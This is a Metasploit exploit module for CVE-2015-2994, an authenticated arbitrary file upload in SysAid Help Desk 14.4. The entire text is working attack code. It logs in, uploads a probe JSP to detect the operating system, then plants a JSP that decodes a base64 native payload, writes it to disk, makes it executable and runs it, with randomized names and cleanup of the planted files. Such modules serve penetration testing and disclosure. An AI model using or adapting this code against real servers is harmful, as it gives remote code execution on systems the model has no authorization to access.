# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;SysAid Help Desk Administrator Portal Arbitrary File Upload&#039;,
      &#039;Description&#039; => %q{
        This module exploits a file upload vulnerability in SysAid Help Desk.
        The vulnerability exists in the ChangePhoto.jsp in the administrator portal,
        which does not handle correctly directory traversal sequences and does not
        enforce file extension restrictions. You need to have an administrator account,
        but there is a Metasploit auxiliary module that can create one for you.
        This module has been tested in SysAid v14.4 in both Linux and Windows.
      },
      &#039;Author&#039;       =>
        [
          &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039; # Vulnerability discovery and Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2015-2994&#039;],
          [&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Jun/8&#039;]
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 5 },
      &#039;Privileged&#039;  => false,
      &#039;Platform&#039;    => %w{ linux win },
      &#039;Arch&#039; => ARCH_X86,
      &#039;Targets&#039;     =>
        [
          [ &#039;Automatic&#039;, { } ],
          [ &#039;SysAid Help Desk v14.4 / Linux&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [ &#039;SysAid Help Desk v14.4 / Windows&#039;,
            {
              &#039;Platform&#039; => &#039;win&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 3 2015&#039;))

    register_options(
      [
        OptPort.new(&#039;RPORT&#039;, [true, &#039;The target port&#039;, 8080]),
        OptString.new(&#039;TARGETURI&#039;, [ true,  "SysAid path", &#039;/sysaid&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to login as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password for the specified username&#039;]),
      ], self.class)
  end


  def check
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;errorInSignUp.htm&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })
    if res && res.code == 200 && res.body.to_s =~ /css\/master\.css\?v([0-9]{1,2})\.([0-9]{1,2})/
      major = $1.to_i
      minor = $2.to_i
      if major == 14 && minor == 4
        return Exploit::CheckCode::Appears
      elsif major > 14
        return Exploit::CheckCode::Safe
      end
    end
    # Haven&#039;t tested in versions < 14.4, so we don&#039;t know if they are vulnerable or not
    return Exploit::CheckCode::Unknown
  end


  def authenticate
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;Login.jsp&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;userName&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })

    if res && res.code == 302 && res.get_cookies
      return res.get_cookies
    else
      return nil
    end
  end


  def upload_payload(payload, is_exploit)
    post_data = Rex::MIME::Message.new
    post_data.add_part(payload,
      &#039;application/octet-stream&#039;, &#039;binary&#039;,
      "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(8))}\"; filename=\"#{Rex::Text.rand_text_alpha(4+rand(10))}.jsp\"")

    data = post_data.to_s

    if is_exploit
      print_status("#{peer} - Uploading payload...")
    end

    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], &#039;ChangePhoto.jsp&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;data&#039;   => data,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;vars_get&#039; => { &#039;isUpload&#039; => &#039;true&#039; }
    })

    if res && res.code == 200 && res.body.to_s =~ /parent.glSelectedImageUrl = \"(.*)\"/
      if is_exploit
        print_status("#{peer} - Payload uploaded successfully")
      end

      return $1
    else
      return nil
    end
  end

  def pick_target
    unless target.name == &#039;Automatic&#039;
      return target
    end

    print_status("#{peer} - Determining target")
    os_finder_payload = %Q{<html><body><%out.println(System.getProperty("os.name"));%></body><html>}
    url = upload_payload(os_finder_payload, false)

    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], url),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;headers&#039; => { &#039;Referer&#039; => Rex::Text.rand_text_alpha(10 + rand(10)) }
    })

    if res && res.code == 200
      if res.body.to_s =~ /Linux/
        register_files_for_cleanup(&#039;webapps/&#039; + url)
        return targets[1]
      elsif res.body.to_s =~ /Windows/
        register_files_for_cleanup(&#039;root/&#039; + url)
        return targets[2]
      end
    end

    nil
  end

  def generate_jsp_payload
    opts = {:arch => @my_target.arch, :platform => @my_target.platform}
    exe = generate_payload_exe(opts)
    base64_exe = Rex::Text.encode_base64(exe)

    native_payload_name = rand_text_alpha(rand(6)+3)
    ext = (@my_target[&#039;Platform&#039;] == &#039;win&#039;) ? &#039;.exe&#039; : &#039;.bin&#039;

    var_raw     = rand_text_alpha(rand(8) + 3)
    var_ostream = rand_text_alpha(rand(8) + 3)
    var_buf     = rand_text_alpha(rand(8) + 3)
    var_decoder = rand_text_alpha(rand(8) + 3)
    var_tmp     = rand_text_alpha(rand(8) + 3)
    var_path    = rand_text_alpha(rand(8) + 3)
    var_proc2   = rand_text_alpha(rand(8) + 3)

    if @my_target[&#039;Platform&#039;] == &#039;linux&#039;
      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
      chmod = %Q|
      Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path});
      Thread.sleep(200);
      |

      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
      cleanup = %Q|
      Thread.sleep(200);
      Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path});
      |
    else
      chmod = &#039;&#039;
      cleanup = &#039;&#039;
    end

    jsp = %Q|
    <%@page import="java.io.*"%>
    <%@page import="sun.misc.BASE64Decoder"%>
    <%
    try {
      String #{var_buf} = "#{base64_exe}";
      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

      File #{var_tmp} = File.createTempFile("#{native_payload_name}", "#{ext}");
      String #{var_path} = #{var_tmp}.getAbsolutePath();

      BufferedOutputStream #{var_ostream} =
        new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      #{chmod}
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
      #{cleanup}
    } catch (Exception e) {
    }
    %>
    |

    jsp = jsp.gsub(/\n/, &#039;&#039;)
    jsp = jsp.gsub(/\t/, &#039;&#039;)
    jsp = jsp.gsub(/\x0d\x0a/, &#039;&#039;)
    jsp = jsp.gsub(/\x0a/, &#039;&#039;)

    return jsp
  end

  def exploit
    @cookie = authenticate
    unless @cookie
      fail_with(Failure::NoAccess, "#{peer} - Unable to authenticate with the provided credentials.")
    end
    print_status("#{peer} - Authentication was successful with the provided credentials.")

    @my_target = pick_target
    if @my_target.nil?
      fail_with(Failure::NoTarget, "#{peer} - Unable to select a target, we must bail.")
    end
    print_status("#{peer} - Selected target #{@my_target.name}")

    # Fail if this is the case and ask the user to select an appropriate payload.
    if @my_target[&#039;Platform&#039;] == &#039;linux&#039; && payload_instance.name =~ /Windows/
      fail_with(Failure::BadConfig, "#{peer} - Select a compatible payload for this Linux target.")
    end

    jsp_payload = generate_jsp_payload
    jsp_path = upload_payload(jsp_payload, true)
    unless jsp_path
      fail_with(Failure::Unknown, "#{peer} - Payload upload failed")
    end

    if @my_target == targets[1]
      register_files_for_cleanup(&#039;webapps/&#039; + jsp_path)
    else
      register_files_for_cleanup(&#039;root/&#039; + jsp_path)
    end

    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      &#039;uri&#039;    => normalize_uri(datastore[&#039;TARGETURI&#039;], jsp_path),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => @cookie,
      &#039;headers&#039; => { &#039;Referer&#039; => Rex::Text.rand_text_alpha(10 + rand(10)) }
    })
  end
end

